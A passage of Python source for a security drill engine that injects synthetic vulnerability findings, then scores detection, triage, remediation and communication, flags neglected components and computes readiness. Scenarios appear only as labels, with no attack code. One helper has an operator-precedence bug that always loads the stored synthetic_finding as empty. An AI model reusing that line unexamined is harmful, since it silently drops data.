                    description         TEXT NOT NULL,
                    severity            TEXT NOT NULL,
                    cve_id              TEXT,
                    cvss_score          REAL NOT NULL DEFAULT 0.0,
                    cwe_ids             TEXT NOT NULL DEFAULT '[]',
                    mitre_techniques    TEXT NOT NULL DEFAULT '[]',
                    mitre_tactics       TEXT NOT NULL DEFAULT '[]',
                    synthetic_finding   TEXT NOT NULL DEFAULT '{}',
                    expected_detection_minutes INTEGER NOT NULL DEFAULT 60,
                    expected_triage_classification TEXT NOT NULL,
                    expected_remediation_approach TEXT NOT NULL DEFAULT '',
                    is_custom           INTEGER NOT NULL DEFAULT 0,
                    created_at          TEXT NOT NULL,
                    tags                TEXT NOT NULL DEFAULT '[]'
                );

                CREATE TABLE IF NOT EXISTS fail_activity_log (
                    activity_id         TEXT PRIMARY KEY,
                    org_id              TEXT NOT NULL,
                    component           TEXT NOT NULL,
                    activity_type       TEXT NOT NULL,
                    description         TEXT NOT NULL DEFAULT '',
                    actor               TEXT,
                    has_critical_data   INTEGER NOT NULL DEFAULT 0,
                    occurred_at         TEXT NOT NULL
                );

                CREATE INDEX IF NOT EXISTS idx_activity_org_component
                    ON fail_activity_log(org_id, component);
                CREATE INDEX IF NOT EXISTS idx_activity_occurred
                    ON fail_activity_log(occurred_at);

                CREATE TABLE IF NOT EXISTS fail_training_samples (
                    sample_id           TEXT PRIMARY KEY,
                    drill_id            TEXT NOT NULL,
                    org_id              TEXT NOT NULL,
                    scenario_id         TEXT NOT NULL,
                    severity            TEXT NOT NULL,
                    detected            INTEGER NOT NULL DEFAULT 0,
                    detection_minutes   INTEGER,
                    detection_label     TEXT NOT NULL DEFAULT 'missed',
                    triage_correct      INTEGER NOT NULL DEFAULT 0,
                    triage_expected     TEXT,
                    triage_actual       TEXT,
                    triage_label        TEXT NOT NULL DEFAULT 'incorrect',
                    features_json       TEXT NOT NULL DEFAULT '{}',
                    created_at          TEXT NOT NULL,
                    FOREIGN KEY (drill_id) REFERENCES fail_drills(drill_id)
                );

                CREATE INDEX IF NOT EXISTS idx_training_org
                    ON fail_training_samples(org_id);
                CREATE INDEX IF NOT EXISTS idx_training_scenario
                    ON fail_training_samples(scenario_id);
            """)

    # ------------------------------------------------------------------
    # Drill CRUD
    # ------------------------------------------------------------------

    def save_drill(self, drill: Drill) -> None:
        with self._conn() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO fail_drills (
                    drill_id, scenario_id, scenario_name, target_component, org_id,
                    status, severity, synthetic_finding_id, synthetic_finding,
                    detected_by, triaged_by, remediated_by, triage_classification,
                    escalated, notified_teams, score_json, timeline_json,
                    created_at, expires_at, notes
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    drill.drill_id,
                    drill.scenario_id,
                    drill.scenario_name,
                    drill.target_component,
                    drill.org_id,
                    drill.status.value,
                    drill.severity.value,
                    drill.synthetic_finding_id,
                    json.dumps(drill.synthetic_finding),
                    drill.detected_by,
                    drill.triaged_by,
                    drill.remediated_by,
                    drill.triage_classification.value if drill.triage_classification else None,
                    int(drill.escalated),
                    json.dumps(drill.notified_teams),
                    json.dumps(drill.score.to_dict()) if drill.score else None,
                    json.dumps(drill.timeline.to_dict()),
                    drill.created_at,
                    drill.expires_at,
                    drill.notes,
                ),
            )

    def get_drill(self, drill_id: str) -> Optional[Dict[str, Any]]:
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM fail_drills WHERE drill_id = ?", (drill_id,)
            ).fetchone()
        if row is None:
            return None
        return self._drill_row_to_dict(row)

    def get_active_drills(self, org_id: str) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM fail_drills
                WHERE org_id = ? AND status NOT IN ('graded', 'cancelled', 'expired')
                ORDER BY created_at DESC
                """,
                (org_id,),
            ).fetchall()
        return [self._drill_row_to_dict(r) for r in rows]

    def get_drill_history(self, org_id: str, days: int = 90) -> List[Dict[str, Any]]:
        cutoff = (_utcnow() - timedelta(days=days)).isoformat()
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM fail_drills
                WHERE org_id = ? AND created_at >= ?
                ORDER BY created_at DESC
                """,
                (org_id, cutoff),
            ).fetchall()
        return [self._drill_row_to_dict(r) for r in rows]

    def get_graded_drills(self, org_id: str, limit: int = 10) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT * FROM fail_drills
                WHERE org_id = ? AND status = 'graded' AND score_json IS NOT NULL
                ORDER BY created_at DESC
                LIMIT ?
                """,
                (org_id, limit),
            ).fetchall()
        return [self._drill_row_to_dict(r) for r in rows]

    def _drill_row_to_dict(self, row: sqlite3.Row) -> Dict[str, Any]:
        d = dict(row)
        d["synthetic_finding"] = json.loads(d.get("synthetic_finding") or "{}")
        d["notified_teams"] = json.loads(d.get("notified_teams") or "[]")
        d["score"] = json.loads(d["score_json"]) if d.get("score_json") else None
        d["timeline"] = json.loads(d.get("timeline_json") or "{}")
        d.pop("score_json", None)
        d.pop("timeline_json", None)
        return d

    # ------------------------------------------------------------------
    # Scenario CRUD
    # ------------------------------------------------------------------

    def upsert_scenario(self, scenario: VulnerabilityScenario) -> None:
        with self._conn() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO fail_scenarios (
                    scenario_id, name, description, severity, cve_id, cvss_score,
                    cwe_ids, mitre_techniques, mitre_tactics, synthetic_finding,
                    expected_detection_minutes, expected_triage_classification,
                    expected_remediation_approach, is_custom, created_at, tags
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    scenario.scenario_id,
                    scenario.name,
                    scenario.description,
                    scenario.severity.value,
                    scenario.cve_id,
                    scenario.cvss_score,
                    json.dumps(scenario.cwe_ids),
                    json.dumps(scenario.mitre_techniques),
                    json.dumps(scenario.mitre_tactics),
                    json.dumps(scenario.synthetic_finding),
                    scenario.expected_detection_minutes,
                    scenario.expected_triage_classification.value,
                    scenario.expected_remediation_approach,
                    int(scenario.is_custom),
                    scenario.created_at,
                    json.dumps(scenario.tags),
                ),
            )

    def get_all_scenarios(self) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                "SELECT * FROM fail_scenarios ORDER BY is_custom ASC, name ASC"
            ).fetchall()
        return [self._scenario_row_to_dict(r) for r in rows]

    def get_scenario(self, scenario_id: str) -> Optional[Dict[str, Any]]:
        with self._conn() as conn:
            row = conn.execute(
                "SELECT * FROM fail_scenarios WHERE scenario_id = ?", (scenario_id,)
            ).fetchone()
        return self._scenario_row_to_dict(row) if row else None

    def _scenario_row_to_dict(self, row: sqlite3.Row) -> Dict[str, Any]:
        d = dict(row)
        for field_name in ("cwe_ids", "mitre_techniques", "mitre_tactics", "synthetic_finding", "tags"):
            d[field_name] = json.loads(d.get(field_name) or "[]" if field_name != "synthetic_finding" else "{}")
        return d

    # ------------------------------------------------------------------
    # Activity log
    # ------------------------------------------------------------------

    def log_activity(
        self,
        org_id: str,
        component: str,
        activity_type: str,
        description: str = "",
        actor: Optional[str] = None,
        has_critical_data: bool = False,
        occurred_at: Optional[str] = None,
    ) -> str:
        activity_id = f"ACT-{uuid.uuid4().hex[:12].upper()}"
        ts = occurred_at or _utcnow_iso()
        with self._conn() as conn:
            conn.execute(
                """
                INSERT INTO fail_activity_log
                    (activity_id, org_id, component, activity_type, description,
                     actor, has_critical_data, occurred_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (activity_id, org_id, component, activity_type, description,
                 actor, int(has_critical_data), ts),
            )
        return activity_id

    def get_component_last_activity(
        self, org_id: str, component: str
    ) -> Optional[Dict[str, Any]]:
        with self._conn() as conn:
            row = conn.execute(
                """
                SELECT * FROM fail_activity_log
                WHERE org_id = ? AND component = ?
                ORDER BY occurred_at DESC
                LIMIT 1
                """,
                (org_id, component),
            ).fetchone()
        return dict(row) if row else None

    def get_components_with_activity(
        self, org_id: str, since: str
    ) -> List[Dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT component,
                       MAX(occurred_at) AS last_activity_at,
                       GROUP_CONCAT(DISTINCT activity_type) AS activity_types,
                       MAX(has_critical_data) AS has_critical_data
                FROM fail_activity_log
                WHERE org_id = ? AND occurred_at >= ?
                GROUP BY component
                """,
                (org_id, since),
            ).fetchall()
        return [dict(r) for r in rows]

    def get_all_known_components(self, org_id: str) -> List[str]:
        with self._conn() as conn:
            rows = conn.execute(
                """
                SELECT DISTINCT target_component FROM fail_drills WHERE org_id = ?
                UNION
                SELECT DISTINCT component FROM fail_activity_log WHERE org_id = ?
                """,
                (org_id, org_id),
            ).fetchall()
        return [r[0] for r in rows]

    # ------------------------------------------------------------------
    # Training samples
    # ------------------------------------------------------------------

    def save_training_sample(self, sample: TrainingSample) -> None:
        with self._conn() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO fail_training_samples (
                    sample_id, drill_id, org_id, scenario_id, severity,
                    detected, detection_minutes, detection_label,
                    triage_correct, triage_expected, triage_actual, triage_label,
                    features_json, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    sample.sample_id,
                    sample.drill_id,
                    sample.org_id,
                    sample.scenario_id,
                    sample.severity,
                    int(sample.detected),
                    sample.detection_minutes,
                    sample.detection_label,
                    int(sample.triage_correct),
                    sample.triage_expected,
                    sample.triage_actual,
                    sample.triage_label,
                    json.dumps(sample.features),
                    sample.created_at,
                ),
            )

    def get_training_data(
        self,
        org_id: Optional[str] = None,
        scenario_id: Optional[str] = None,
        limit: int = 1000,
    ) -> List[Dict[str, Any]]:
        query = "SELECT * FROM fail_training_samples WHERE 1=1"
        params: List[Any] = []
        if org_id:
            query += " AND org_id = ?"
            params.append(org_id)
        if scenario_id:
            query += " AND scenario_id = ?"
            params.append(scenario_id)
        query += " ORDER BY created_at DESC LIMIT ?"
        params.append(limit)
        with self._conn() as conn:
            rows = conn.execute(query, params).fetchall()
        result = []
        for r in rows:
            d = dict(r)
            d["features"] = json.loads(d.get("features_json") or "{}")
            d.pop("features_json", None)
            result.append(d)
        return result


# ---------------------------------------------------------------------------
# Scoring Engine
# ---------------------------------------------------------------------------


class DrillScorer:
    """
    Computes 4-dimension scores for completed drills.

    Dimensions:
      1. Detection Speed (0-10)  — how fast was the synthetic finding noticed?
      2. Triage Accuracy (0-10)  — was it correctly classified?
      3. Remediation Speed (0-10) — how fast was a fix applied?
      4. Communication (0-10)   — was the right team notified + escalation followed?

    Overall = weighted average: 0.30, 0.25, 0.30, 0.15
    """

    def score(
        self,
        drill: Drill,
        scenario: VulnerabilityScenario,
        detection_minutes: Optional[int] = None,
        triage_classification: Optional[TriageClassification] = None,
        remediation_minutes: Optional[int] = None,
        escalated: bool = False,
        team_notified: bool = False,
        notified_teams: Optional[List[str]] = None,
    ) -> DrillScore:
        """Compute all four dimension scores and overall."""

        ds = self._score_detection_speed(
            detection_minutes, scenario.expected_detection_minutes
        )
        ta = self._score_triage_accuracy(
            triage_classification, scenario.expected_triage_classification
        )
        rs = self._score_remediation_speed(
            remediation_minutes, detection_minutes
        )
        comm = self._score_communication(
            escalated, team_notified, notified_teams or [], scenario.severity
        )

        overall = (
            ds * SCORE_WEIGHTS["detection_speed"]
            + ta * SCORE_WEIGHTS["triage_accuracy"]
            + rs * SCORE_WEIGHTS["remediation_speed"]
            + comm * SCORE_WEIGHTS["communication"]
        )
        overall = round(max(0.0, min(10.0, overall)), 2)

        grade = self._overall_to_grade(overall)
        feedback = self._generate_feedback(
            ds, ta, rs, comm, detection_minutes, scenario
        )

        return DrillScore(
            drill_id=drill.drill_id,
            detection_speed=round(ds, 2),
            triage_accuracy=round(ta, 2),
            remediation_speed=round(rs, 2),
            communication=round(comm, 2),
            overall=overall,
            detection_minutes_actual=detection_minutes,
            detection_minutes_target=scenario.expected_detection_minutes,
            triage_classification_actual=triage_classification.value if triage_classification else None,
            triage_classification_expected=scenario.expected_triage_classification.value,
            remediation_minutes_actual=remediation_minutes,
            escalated_correctly=escalated,
            team_notified=team_notified,
            grade=grade,
            feedback=feedback,
        )

    # ------------------------------------------------------------------
    # Dimension scorers
    # ------------------------------------------------------------------

    def _score_detection_speed(
        self,
        actual_minutes: Optional[int],
        target_minutes: int,
    ) -> float:
        """Score detection speed: 10.0 = instant, 0.0 = missed/very late."""
        if actual_minutes is None:
            return 0.0  # Not detected at all
        if actual_minutes <= 0:
            return 10.0
        # Exponential decay based on target
        ratio = actual_minutes / max(1, target_minutes)
        if ratio <= 0.25:
            return 10.0
        elif ratio <= 0.5:
            return 9.0
        elif ratio <= 1.0:
            return 8.0 - (ratio - 0.5) * 4.0      # 8.0 → 6.0 as ratio 0.5→1.0
        elif ratio <= 2.0:
            return 6.0 - (ratio - 1.0) * 3.0      # 6.0 → 3.0 as ratio 1.0→2.0
        elif ratio <= 5.0:
            return 3.0 - (ratio - 2.0) * 0.8      # 3.0 → 0.6 as ratio 2.0→5.0
        else:
            return max(0.0, 0.6 - (ratio - 5.0) * 0.1)

    def _score_triage_accuracy(
        self,
        actual: Optional[TriageClassification],
        expected: TriageClassification,
    ) -> float:
        """Score triage accuracy based on how close the classification is."""
        if actual is None:
            return 0.0

        # Exact match
        if actual == expected:
            return 10.0

        # Special cases
        if actual == TriageClassification.SYNTHETIC:
            # Team identified it as a drill — still gets partial credit
            return 5.0

        if actual == TriageClassification.FALSE_POSITIVE:
            # Incorrectly dismissed
            return 1.0

        # Severity mismatch scoring
        severity_order = {
            TriageClassification.REAL_CRITICAL: 4,
            TriageClassification.REAL_HIGH: 3,
            TriageClassification.REAL_MEDIUM: 2,
            TriageClassification.REAL_LOW: 1,
            TriageClassification.FALSE_POSITIVE: 0,
            TriageClassification.SYNTHETIC: -1,
            TriageClassification.WONT_FIX: -2,
        }
        exp_val = severity_order.get(expected, 2)
        act_val = severity_order.get(actual, 2)
        diff = abs(exp_val - act_val)
        if diff == 0:
            return 10.0
        elif diff == 1:
            return 7.0
        elif diff == 2:
            return 4.0
        elif diff == 3:
            return 2.0
        else:
            return 0.5

    def _score_remediation_speed(
        self,
        remediation_minutes: Optional[int],
        detection_minutes: Optional[int],
    ) -> float:
        """Score remediation speed relative to SLA."""
        if detection_minutes is None:
            return 0.0  # Can't remediate what wasn't detected
        if remediation_minutes is None:
            return 0.0  # Not remediated

        ratio = remediation_minutes / max(1, REMEDIATION_SLA_MINUTES)
        if ratio <= 0.25:
            return 10.0
        elif ratio <= 0.5:
            return 9.0
        elif ratio <= 1.0:
            score = 9.0 - (ratio - 0.5) * 6.0    # 9→6 as ratio 0.5→1
            return max(6.0, score)
        elif ratio <= 2.0:
            return 6.0 - (ratio - 1.0) * 3.0
        elif ratio <= 4.0:
            return max(1.0, 3.0 - (ratio - 2.0) * 1.0)
        else:
            return max(0.0, 1.0 - (ratio - 4.0) * 0.1)

    def _score_communication(
        self,
        escalated: bool,
        team_notified: bool,
        notified_teams: List[str],
        severity: Severity,
    ) -> float:
        """Score communication quality."""
        score = 0.0

        # Team notification
        if team_notified or notified_teams:
            score += 4.0

        # Escalation for critical/high
        if severity in (Severity.CRITICAL, Severity.HIGH):
            if escalated:
                score += 4.0
            # Multiple teams notified
            if len(notified_teams) >= 2:
                score += 2.0
        else:
            # For medium/low, notification alone is fine
            if escalated or len(notified_teams) >= 2:
                score += 3.0
            score = min(10.0, score + 3.0)

        return min(10.0, score)

    def _overall_to_grade(self, score: float) -> str:
        if score >= 9.0:
            return "A+"
        elif score >= 8.0:
            return "A"
        elif score >= 7.0:
            return "B"
        elif score >= 6.0:
            return "C"
        elif score >= 5.0:
            return "D"
        else:
            return "F"

    def _generate_feedback(
        self,
        detection_speed: float,
        triage_accuracy: float,
        remediation_speed: float,
        communication: float,
        detection_minutes: Optional[int],
        scenario: VulnerabilityScenario,
    ) -> List[str]:
        """Generate human-readable feedback for each dimension."""
        feedback = []

        if detection_speed < 5.0:
            if detection_minutes is None:
                feedback.append(
                    f"DETECTION MISS: The synthetic {scenario.name} finding was never detected. "
                    "Review alerting and monitoring coverage for this component."
                )
            else:
                feedback.append(
                    f"SLOW DETECTION: {detection_minutes} min actual vs "
                    f"{scenario.expected_detection_minutes} min target. "
                    "Consider automated detection rules for this scenario type."
                )
        elif detection_speed >= 8.0:
            feedback.append(f"FAST DETECTION: Excellent — {detection_minutes} min response time.")

        if triage_accuracy < 5.0:
            feedback.append(
                f"TRIAGE MISS: The finding was mis-classified. Expected "
                f"'{scenario.expected_triage_classification.value}'. "
                "Improve triage runbook for this vulnerability class."
            )
        elif triage_accuracy >= 8.0:
            feedback.append("TRIAGE ACCURATE: Correct severity classification.")

        if remediation_speed < 5.0:
            feedback.append(
                "SLOW REMEDIATION: Fix took longer than the 8-hour SLA target. "
                f"Recommended approach: {scenario.expected_remediation_approach[:120]}..."
            )

        if communication < 5.0:
            feedback.append(
                "COMMUNICATION GAP: Escalation or team notification was incomplete. "
                "Verify incident escalation matrix is followed for this severity."
            )

        return feedback


# ---------------------------------------------------------------------------
# Neglect Zone Detector
# ---------------------------------------------------------------------------


class NeglectZoneDetector:
    """
    Identifies components with no recent security activity.
    Components with no activity in 90+ days are flagged as neglect zones.
    """

    def __init__(self, db: DrillDB) -> None:
        self._db = db

    def detect(
        self, org_id: str, threshold_days: int = NEGLECT_THRESHOLD_DAYS
    ) -> List[NeglectZone]:
        """Detect all neglect zones for an organisation."""
        cutoff = (_utcnow() - timedelta(days=threshold_days)).isoformat()
        active_components = {
            r["component"]: r
            for r in self._db.get_components_with_activity(org_id, cutoff)
        }
        all_components = self._db.get_all_known_components(org_id)

        neglect_zones: List[NeglectZone] = []
        for component in all_components:
            if component in active_components:
                continue

            # Find last activity ever for this component
            last = self._db.get_component_last_activity(org_id, component)
            last_at: Optional[str] = last["occurred_at"] if last else None
            has_critical = bool(last.get("has_critical_data", 0)) if last else False

            if last_at:
                last_dt = datetime.fromisoformat(last_at)
                if last_dt.tzinfo is None:
                    last_dt = last_dt.replace(tzinfo=timezone.utc)
                days_since = (_utcnow() - last_dt).days
            else:
                days_since = 999

            risk = self._calculate_risk(days_since, has_critical)
            suggested = self._suggest_drill(component, days_since)

            reason = (
                f"No security activity in {days_since} days "
                f"(threshold: {threshold_days} days)."
            )
            if has_critical:
                reason += " Component holds critical data — elevated risk."

            neglect_zones.append(NeglectZone(
                component=component,
                org_id=org_id,
                last_activity_at=last_at,
                days_since_activity=days_since,
                activity_types_missing=["scan", "review", "drill"],
                risk_level=risk,
                has_critical_data=has_critical,
                suggested_drill_scenario=suggested,
                reason=reason,
            ))

        neglect_zones.sort(key=lambda z: (z.risk_level == "urgent", z.has_critical_data,
                                           z.days_since_activity), reverse=True)
        return neglect_zones

    def _calculate_risk(self, days_since: int, has_critical_data: bool) -> str:
        if has_critical_data and days_since >= threshold_days_for_urgent():
            return "urgent"
        if days_since >= 180:
            return "high"
        elif days_since >= 120:
            return "medium"
        else:
            return "low"

    def _suggest_drill(self, component: str, days_since: int) -> str:
        """Suggest a relevant drill based on component name heuristics."""
        name = component.lower()
        if any(x in name for x in ("auth", "login", "sso", "oauth", "jwt")):
            return "broken_auth"
        if any(x in name for x in ("db", "database", "sql", "data", "repo")):
            return "sqli"
        if any(x in name for x in ("api", "gateway", "proxy", "fetch")):
            return "ssrf"
        if any(x in name for x in ("file", "storage", "upload", "s3")):
            return "path_traversal"
        if any(x in name for x in ("log", "logger", "monitor", "trace")):
            return "log4shell"
        if any(x in name for x in ("secret", "config", "env", "key")):
            return "hardcoded_credentials"
        if any(x in name for x in ("web", "ui", "frontend", "html")):
            return "xss"
        if any(x in name for x in ("crypto", "encrypt", "hash", "sign")):
            return "crypto_weakness"
        if any(x in name for x in ("dep", "package", "pip", "npm", "lib")):
            return "supply_chain"
        # Default for old components: suggest the high-impact one
        return "log4shell" if days_since >= 180 else "hardcoded_credentials"


def threshold_days_for_urgent() -> int:
    """Return the threshold for urgent risk level."""
    return NEGLECT_THRESHOLD_DAYS


# ---------------------------------------------------------------------------
# Readiness Calculator
# ---------------------------------------------------------------------------


class ReadinessCalculator:
    """
    Calculates organisation readiness scores from drill history.

    Readiness = rolling average of last N drill scores (default: last 10).
    Trend is computed from the last 5 vs previous 5 drills.
    """

    def __init__(self, db: DrillDB, benchmark: float = INDUSTRY_BENCHMARK_DEFAULT) -> None:
        self._db = db
        self._benchmark = benchmark

    def calculate(self, org_id: str) -> ReadinessScore:
        graded = self._db.get_graded_drills(org_id, limit=READINESS_DRILL_WINDOW * 2)
        if not graded:
            return ReadinessScore(
                org_id=org_id,
                overall_score=0.0,
                drill_count=0,
                last_drill_at=None,
                trend=ReadinessTrend.INSUFFICIENT_DATA,
                team_scores={},
                dimension_averages={},
                industry_benchmark=self._benchmark,
                benchmark_delta=0.0 - self._benchmark,
                percentile=0,
                graded_drills=[],
            )

        scores = [d["score"] for d in graded if d.get("score")]
        overall_scores = [s["overall"] for s in scores if s]
        window = overall_scores[:READINESS_DRILL_WINDOW]
        overall = round(sum(window) / len(window), 2) if window else 0.0

        trend = self._compute_trend(overall_scores)
        team_scores = self._compute_team_scores(graded)
        dim_averages = self._compute_dimension_averages(scores)
        delta = round(overall - self._benchmark, 2)
        percentile = self._estimate_percentile(overall)

        return ReadinessScore(
            org_id=org_id,
            overall_score=overall,
            drill_count=len(graded),
            last_drill_at=graded[0].get("created_at") if graded else None,
            trend=trend,
            team_scores=team_scores,
            dimension_averages=dim_averages,
            industry_benchmark=self._benchmark,
            benchmark_delta=delta,
            percentile=percentile,
            graded_drills=[
                {"drill_id": d["drill_id"], "scenario_id": d["scenario_id"],
                 "overall": d["score"].get("overall") if d.get("score") else None,
                 "created_at": d["created_at"]}
                for d in graded[:READINESS_DRILL_WINDOW]
            ],
        )

    def _compute_trend(self, scores: List[float]) -> ReadinessTrend:
        if len(scores) < 4:
            return ReadinessTrend.INSUFFICIENT_DATA
        recent = scores[:min(5, len(scores) // 2)]
        older = scores[min(5, len(scores) // 2):]
        if not recent or not older:
            return ReadinessTrend.INSUFFICIENT_DATA
        avg_recent = sum(recent) / len(recent)
        avg_older = sum(older) / len(older)
        delta = avg_recent - avg_older
        if delta > 0.5:
            return ReadinessTrend.IMPROVING
        elif delta < -0.5:
            return ReadinessTrend.DECLINING
        else:
            return ReadinessTrend.STABLE

    def _compute_team_scores(self, drills: List[Dict[str, Any]]) -> Dict[str, float]:
        """Group scores by remediated_by / detected_by fields as a proxy for team."""
        team_map: Dict[str, List[float]] = {}
        for d in drills:
            if not d.get("score"):
                continue
            actors = [d.get("detected_by"), d.get("triaged_by"), d.get("remediated_by")]
            teams = {a.split("@")[0] if a and "@" in a else a for a in actors if a}
            for team in teams:
                if team:
                    team_map.setdefault(team, []).append(d["score"]["overall"])
        return {
            team: round(sum(scores) / len(scores), 2)
            for team, scores in team_map.items()
        }

    def _compute_dimension_averages(self, scores: List[Dict[str, Any]]) -> Dict[str, float]:
        dims = ["detection_speed", "triage_accuracy", "remediation_speed", "communication"]
        result: Dict[str, float] = {}
        for dim in dims:
            vals = [s[dim] for s in scores if s and dim in s]
            result[dim] = round(sum(vals) / len(vals), 2) if vals else 0.0
        return result

    def _estimate_percentile(self, score: float) -> int:
        """Estimate percentile relative to industry benchmark distribution."""
        # Assume normal distribution centred on benchmark with std dev 1.5
        import math
        mu = self._benchmark
        sigma = 1.5
        z = (score - mu) / sigma
        # Approximate CDF
        percentile = 50 * (1 + math.erf(z / math.sqrt(2)))
        return max(1, min(99, int(percentile)))


# ---------------------------------------------------------------------------
# Training Data Generator
# ---------------------------------------------------------------------------


class TrainingDataGenerator:
    """
    Generates labeled ML training samples from completed drills.

    Every graded drill contributes two types of samples:
    1. Detection signal: was the finding detected and how fast?
    2. Triage signal: was the classification correct?
    """

    def generate(self, drill: Drill, scenario: VulnerabilityScenario) -> TrainingSample:
        detection_minutes = self._compute_detection_minutes(drill)
        detected = detection_minutes is not None

        detection_label = self._detection_label(
            detection_minutes, scenario.expected_detection_minutes
        )

        triage_actual = drill.triage_classification
        triage_expected = scenario.expected_triage_classification
        triage_correct = (triage_actual == triage_expected)
        triage_label = (
            "correct" if triage_correct
            else "skipped" if triage_actual is None
            else "incorrect"
        )

        features = {
            "scenario_id": scenario.scenario_id,
            "severity": scenario.severity.value,
            "cvss_score": scenario.cvss_score,
            "cwe_count": len(scenario.cwe_ids),
            "mitre_technique_count": len(scenario.mitre_techniques),
            "target_component": drill.target_component,
            "detection_minutes": detection_minutes,
            "detection_target_minutes": scenario.expected_detection_minutes,
            "escalated": drill.escalated,
            "team_count_notified": len(drill.notified_teams),
            "overall_score": drill.score.overall if drill.score else None,
        }

        return TrainingSample(
            sample_id=f"TRN-{uuid.uuid4().hex[:12].upper()}",
            drill_id=drill.drill_id,
            org_id=drill.org_id,
            scenario_id=scenario.scenario_id,
            severity=scenario.severity.value,
            detected=detected,
            detection_minutes=detection_minutes,
            detection_label=detection_label,
            triage_correct=triage_correct,
            triage_expected=triage_expected.value if triage_expected else None,
            triage_actual=triage_actual.value if triage_actual else None,
            triage_label=triage_label,
            features=features,
        )

    def _compute_detection_minutes(self, drill: Drill) -> Optional[int]:
        tl = drill.timeline
        if not tl.injected_at or not tl.detected_at:
            return None
        try:
            injected = datetime.fromisoformat(tl.injected_at)
            detected = datetime.fromisoformat(tl.detected_at)
            if injected.tzinfo is None:
                injected = injected.replace(tzinfo=timezone.utc)
            if detected.tzinfo is None:
                detected = detected.replace(tzinfo=timezone.utc)
            delta = (detected - injected).total_seconds() / 60
            return max(0, int(delta))
        except (ValueError, TypeError):
            return None

    def _detection_label(
        self, actual_minutes: Optional[int], target_minutes: int
    ) -> str:
        if actual_minutes is None:
            return "missed"
        ratio = actual_minutes / max(1, target_minutes)
        if ratio <= 1.0:
            return "fast"
        elif ratio <= 3.0:
            return "slow"
        else:
            return "very_slow"


# ---------------------------------------------------------------------------
# Main DrillEngine
# ---------------------------------------------------------------------------


class DrillEngine:
    """
    The FAIL Engine — Fault & Attack Injection Layer (suite-attack edition).

    This is the primary interface for the chaos engineering system.
    Inject synthetic vulnerabilities, track team response, grade performance,
    detect neglect zones, and compute readiness scores.
    """

    VERSION = ENGINE_VERSION

    def __init__(
        self,
        db_path: Optional[Path] = None,
        industry_benchmark: float = INDUSTRY_BENCHMARK_DEFAULT,
    ) -> None:
        self._db = DrillDB(db_path)
        self._scorer = DrillScorer()
        self._neglect_detector = NeglectZoneDetector(self._db)
        self._readiness_calc = ReadinessCalculator(self._db, industry_benchmark)
        self._training_gen = TrainingDataGenerator()
        self._scenarios: Dict[str, VulnerabilityScenario] = _build_scenario_library()
        self._seed_scenarios()

    def _seed_scenarios(self) -> None:
        """Persist built-in scenarios to DB (idempotent)."""
        for scenario in self._scenarios.values():
            try:
                self._db.upsert_scenario(scenario)
            except Exception as exc:
                logger.warning("Failed to seed scenario %s: %s", scenario.scenario_id, exc)

    # ------------------------------------------------------------------
    # Drill lifecycle
    # ------------------------------------------------------------------

    def create_drill(
        self,
        scenario: str,
        target_component: str,
        org_id: str,
        notes: str = "",
        injected_by: Optional[str] = None,
    ) -> Drill:
        """
        Inject a synthetic vulnerability finding for the given scenario
        into the named component for the given organisation.

        Returns the created Drill with status=ACTIVE.
        """
        sc = self._get_scenario_or_raise(scenario)

        drill_id = f"DRILL-{uuid.uuid4().hex[:12].upper()}"
        now = _utcnow_iso()

        # Build the synthetic finding with drill metadata embedded
        finding = dict(sc.synthetic_finding)
        finding["drill_id"] = drill_id
        finding["injected_at"] = now
        finding["target_component"] = target_component
        finding["org_id"] = org_id

        timeline = DrillTimeline(drill_id=drill_id)
        timeline.injected_at = now
        timeline.add_event(
            "injected",
            f"Synthetic {sc.name} finding injected into {target_component}",
            actor=injected_by or "fail-engine",
        )

        drill = Drill(
            drill_id=drill_id,
            scenario_id=sc.scenario_id,
            scenario_name=sc.name,
            target_component=target_component,
            org_id=org_id,
            status=DrillStatus.ACTIVE,
            severity=sc.severity,
            synthetic_finding=finding,
            timeline=timeline,
            created_at=now,
            notes=notes,
        )

        self._db.save_drill(drill)

        # Log the drill as security activity for the component
        self._db.log_activity(
            org_id=org_id,
            component=target_component,
            activity_type="drill",
            description=f"FAIL drill injected: {sc.name}",
            actor=injected_by or "fail-engine",
        )

        logger.info(
            "FAIL drill created: %s scenario=%s component=%s org=%s",
            drill_id, scenario, target_component, org_id,
        )
        return drill

    def get_active_drills(self, org_id: str) -> List[Dict[str, Any]]:
        """Return all active (non-graded, non-cancelled) drills for an org."""
        return self._db.get_active_drills(org_id)

    def get_drill(self, drill_id: str) -> Optional[Dict[str, Any]]:
        """Return a single drill by ID with full timeline and score."""
        return self._db.get_drill(drill_id)

    def mark_detected(
        self,
        drill_id: str,
        detected_by: Optional[str] = None,
        detection_note: str = "",
    ) -> Dict[str, Any]:
        """Signal that the synthetic finding was detected."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        if drill.status not in (DrillStatus.ACTIVE, DrillStatus.PENDING):
            raise ValueError(f"Drill {drill_id} is not active (status={drill.status.value})")

        now = _utcnow_iso()
        drill.status = DrillStatus.DETECTED
        drill.detected_by = detected_by
        drill.timeline.detected_at = now
        drill.timeline.add_event(
            "detected",
            f"Synthetic finding detected. {detection_note}".strip(),
            actor=detected_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def mark_triaged(
        self,
        drill_id: str,
        classification: str,
        triaged_by: Optional[str] = None,
        escalated: bool = False,
        notified_teams: Optional[List[str]] = None,
        triage_note: str = "",
    ) -> Dict[str, Any]:
